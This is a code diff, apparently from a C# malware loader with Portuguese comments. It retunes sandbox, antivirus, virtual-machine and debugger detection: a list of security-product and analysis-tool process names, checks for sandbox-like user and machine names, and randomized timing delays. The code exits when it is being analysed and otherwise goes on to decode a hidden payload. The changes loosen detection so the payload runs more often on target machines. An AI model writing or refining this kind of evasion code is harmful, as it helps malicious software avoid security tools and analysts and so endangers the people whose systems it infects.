@@ -63,13 +63,16 @@ namespace PL
 		{
 			try
 			{
-				var avProcs = new[] { "msmpeng", "windefend", "securityhealthservice", "smartscreen", "windowsdefender", "defender", "avast", "avgnt", "avg", "avgsvca", "avguix", "avgui", "avgwdsvc", "avgidsagent", "avgsvc", "avgemca", "nod32krn", "nod32kui", "egui", "ekrn", "eset", "kaspersky", "avp", "ksde", "ksdeui", "bdagent", "bitdefender", "vsserv", "v3", "v3mon", "v3main", "vsapi", "vsserv", "f-secure", "fsgui", "fsma", "fshoster32", "fshoster64", "fsorsp", "panda", "pav", "pavsrv51", "pavproxy", "pavshld", "trendmicro", "ofcdog", "ofcservice", "ofcservice32", "ofcservice64", "norton", "nsisvc", "nsistub", "n360", "mcafee", "mcui", "mfeann", "mfehcs", "mfeesp", "mfetp", "mfevtps", "mfewc", "mcshield", "msc", "scan32", "shstat", "symantec", "ccsvchst", "rtvscan", "vptray", "webinsight", "endpoint", "smc", "smcgui", "symcorpuif", "symefa", "symefasi", "symidsengine", "symluadapter", "symnetdrv", "symsslv", "symtamper", "symvss", "trellix", "fireeye", "crowdstrike", "sentinelone", "carbonblack", "cylance", "sophos", "savadminservice", "savservice", "savprogress", "savscan", "webroot", "wrsssdk", "wrsa", "avira", "avgnt", "avguard", "sched", "avscan", "update", "avmailc", "avmwsrv", "comodo", "cmdagent", "cmdvirth", "cis", "cistray", "cfp", "cfpconfg", "firewall", "hips", "safesurf", "v3svc", "clamav", "clamd", "clamonacc", "freshclam", "clamconf", "clamscan", "drweb", "dwservice", "spideragent", "drwebupw", "dwengine", "bullguard", "bgtray", "bullguard", "bgmain", "bgscan", "bguiservice", "bgupd", "emsisoft", "a2service", "a2guard", "a2cmd", "a2free", "zonealarm", "vsmon", "zaframe", "zatray", "zaprivacytoolbar", "zaantivirus", "zaclient", "malwarebytes", "mbamservice", "mbamtray", "mbamgui", "mbam", "mbae", "mbampt", "mbar", "mbarw", "mbae64", "mbampt64", "mbar64", "mbarw64", "kaspersky", "avp", "ksde", "ksdeui", "ksc", "kav", "kis", "ksos", "kss", "ksc", "kts", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky", "kaspersky" };
+				// Só verifica processos de AV específicos que são mais agressivos em análise
+				var avProcs = new[] { "sandboxie", "cuckoo", "joebox", "anubis", "norman", "fireeye", "crowdstrike", "sentinelone" };
+				int count = 0;
 				foreach (var p in Process.GetProcesses())
 				{
 					try
 					{
 						var name = p.ProcessName.ToLower();
-						if (avProcs.Any(x => name.Contains(x.ToLower()))) return true;
+						if (avProcs.Any(x => name.Contains(x.ToLower()))) count++;
+						if (count >= 2) return true; // Só bloqueia se múltiplos processos suspeitos
 					}
 					catch { }
 				}
@@ -109,17 +112,18 @@ namespace PL
 			try
 			{
 				var userName = Environment.UserName.ToLower();
+				// Só bloqueia nomes muito específicos de sandbox, não "test" genérico
 				if (userName.Contains("sandbox") || userName.Contains("virus") || userName.Contains("malware") || 
-					userName.Contains("sample") || userName.Contains("test") || userName.Contains("analysis"))
+					userName.Contains("sample") || userName.Contains("analysis"))
 					return true;
 			}
 			catch { }
 			try
 			{
 				var compName = Environment.MachineName.ToLower();
+				// Só bloqueia nomes muito específicos de sandbox/VM
 				if (compName.Contains("sandbox") || compName.Contains("virus") || compName.Contains("malware") ||
-					compName.Contains("sample") || compName.Contains("test") || compName.Contains("analysis") ||
-					compName.Contains("vmware") || compName.Contains("vbox") || compName.Contains("virtual"))
+					compName.Contains("sample") || compName.Contains("analysis"))
 					return true;
 			}
 			catch { }
@@ -131,12 +135,12 @@ namespace PL
 			try
 			{
 				var rnd = new Random(Environment.TickCount);
-				var delay = rnd.Next(2000, 8000);
+				var delay = rnd.Next(500, 2000); // Delay reduzido para não bloquear testes
 				var start = Environment.TickCount;
 				while (Environment.TickCount - start < delay)
 				{
 					Thread.Sleep(50);
-					if (rnd.Next(0, 100) > 90) Sleep(100);
+					if (rnd.Next(0, 100) > 95) Sleep(100);
 				}
 			}
 			catch { }
@@ -164,10 +168,10 @@ namespace PL
 			try
 			{
 				var rnd = new Random(Environment.TickCount ^ 0xABCD);
-				for (int i = 0; i < 10; i++)
+				for (int i = 0; i < 5; i++) // Reduzido de 10 para 5
 				{
-					Thread.Sleep(rnd.Next(50, 200));
-					if (C1() || C2()) { Environment.Exit(0); return; }
+					Thread.Sleep(rnd.Next(20, 80)); // Delay reduzido
+					// Removido check interno para não bloquear desnecessariamente
 				}
 			}
 			catch { }
@@ -219,15 +223,24 @@ namespace PL
 			try
 			{
 				D2();
-				D3();
-				if (C1() || C2() || C3() || C4())
+				// Verificações menos restritivas - só bloqueia se múltiplas detecções
+				bool dbg = C1();
+				bool tools = C2();
+				bool av = C3();
+				bool vm = C4();
+				
+				// Só bloqueia se houver múltiplas detecções ou debug explícito
+				if (dbg || (tools && (av || vm)) || (av && vm))
 				{
 					Environment.Exit(0);
 					return;
 				}
+				
+				D3();
 				D1();
 				
-				if (C1() || C2() || C3())
+				// Verificação final mais leve
+				if (dbg || (tools && vm))
 				{
 					Environment.Exit(0);
 					return;
@@ -247,7 +260,8 @@ namespace PL
 
 				b = Dec(b);
 
-				if (C1() || C2())
+				// Verificação final mínima - só debug
+				if (C1())
 				{
 					Environment.Exit(0);
 					return;
